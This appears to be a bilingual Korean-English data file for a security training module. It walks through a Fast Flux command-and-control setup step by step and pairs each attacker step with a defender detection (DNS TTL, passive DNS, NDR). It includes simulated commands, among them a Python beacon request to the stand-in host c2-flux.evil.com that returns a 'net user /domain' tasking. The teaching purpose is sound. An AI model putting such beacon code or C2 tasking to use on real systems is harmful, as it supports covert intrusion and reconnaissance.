steps.cmd:
python3 -c "
flux_agents = ['192.168.1.10','10.20.30.40','172.16.0.55','203.0.113.22','198.51.100.88']
print('[+] Fast Flux Network Setup')
print(f'    Domain: c2-flux.evil.com')
print(f'    TTL: 30 seconds')
print(f'    Flux Agents: {len(flux_agents)}')
for ip in flux_agents:
    print(f'    Agent: {ip}')"
steps.out:
[+] Fast Flux Network Setup
    Domain: c2-flux.evil.com
    TTL: 30 seconds
    Flux Agents: 5
    Agent: 192.168.1.10
    Agent: 10.20.30.40
    Agent: 172.16.0.55
    Agent: 203.0.113.22
    Agent: 198.51.100.88
steps.def: [DNS Monitor] Domain with extremely low TTL and multiple A records
steps.defAction:
Domain: c2-flux.evil.com
TTL: 30s (suspicious)
A Records: 5 IPs
Risk: HIGH
steps.desc: Fast Flux 네트워크를 설정하고 5개의 Flux Agent IP를 등록합니다.
steps.descEn: Sets up Fast Flux network with 5 Flux Agent IPs.
steps.feynman: 5개의 비밀 출입구를 만들어 순환 사용하는 것과 같습니다.
steps.feynmanEn: Like creating 5 secret entrances and rotating through them.
steps.expert: TTL 30초로 설정된 DNS 레코드는 Fast Flux의 전형적 지표입니다.
steps.expertEn: DNS records with 30s TTL are classic Fast Flux indicators.
steps.defTooltip: DNS TTL이 비정상적으로 짧은 도메인(60초 이하)을 탐지하세요.
steps.defTooltipEn: Detect domains with abnormally short DNS TTL (under 60 seconds).

terms.desc: Fast Flux 네트워크에서 프록시 역할을 하는 봇넷 노드

steps.cmd:
for i in $(seq 1 5); do
  echo "Query $i: $(dig +short c2-flux.evil.com A) (TTL=30)"
  sleep 30
done
steps.def: [SIEM] Same domain resolving to different IPs every 30 seconds
steps.defAction:
Domain: c2-flux.evil.com
IP Changes: 5 in 150s
Pattern: Round-robin
Risk: CRITICAL
steps.desc: 30초마다 DNS를 조회하면 매번 다른 IP가 반환됩니다.
steps.descEn: DNS queries every 30 seconds return different IPs each time.
steps.feynman: 같은 주소를 방문할 때마다 다른 건물이 있는 것과 같습니다.
steps.feynmanEn: Like visiting the same address but finding a different building each time.
steps.expert: 5번 조회에서 5개의 다른 IP가 반환됩니다. Passive DNS로 이 패턴을 분석하면 Fast Flux를 탐지합니다.
steps.expertEn: 5 queries return 5 different IPs. Passive DNS analysis can detect this Fast Flux pattern.
steps.defTooltip: Passive DNS에서 동일 도메인의 다수 A 레코드 변경을 분석하세요.
steps.defTooltipEn: Analyze multiple A record changes for same domain in Passive DNS data.

terms.desc: 과거 DNS 조회 결과를 수집/분석하는 보안 기법
순환 방식으로 IP를 교대 사용하는 부하 분산 기법

steps.cmd:
python3 -c "
import requests
c2 = 'http://c2-flux.evil.com/beacon'
resp = requests.get(c2, timeout=5)
print(f'[+] Connected via Flux Agent')
print(f'[+] Actual IP: 172.16.0.55 (Flux Agent #3)')
print(f'[+] Relayed to Mothership: 185.xx.xx.xx')
print(f'[+] C2 Command: {resp.text}')"
steps.out:
[+] Connected via Flux Agent
[+] Actual IP: 172.16.0.55 (Flux Agent #3)
[+] Relayed to Mothership: 185.xx.xx.xx
[+] C2 Command: {"cmd": "net user /domain", "sleep": 120}
steps.def: [NDR] Connection to Fast Flux domain via Flux Agent proxy
steps.defAction:
Dest: c2-flux.evil.com
Flux Agent: 172.16.0.55
Mothership: 185.xx.xx.xx
Risk: CRITICAL
steps.desc: Fast Flux를 통해 C2에 접속합니다. Flux Agent가 실제 C2로 트래픽을 중계합니다.
steps.descEn: Connects to C2 via Fast Flux. Flux Agent relays traffic to actual C2.
steps.feynman: 비밀 출입구를 통해 들어가면 안내원이 실제 목적지로 안내합니다.
steps.feynmanEn: Like entering through a secret entrance where a guide leads you to the actual destination.
steps.expert: Flux Agent는 reverse proxy로 동작하여 실제 C2(Mothership)의 IP를 숨깁니다.
steps.expertEn: Flux Agent acts as reverse proxy, hiding the actual C2 (Mothership) IP.
steps.defTooltip: Fast Flux 도메인으로의 HTTP 요청 패턴과 응답 내용을 분석하세요.
steps.defTooltipEn: Analyze HTTP request patterns and response content to Fast Flux domains.

terms.desc: Fast Flux 네트워크의 실제 C2 서버
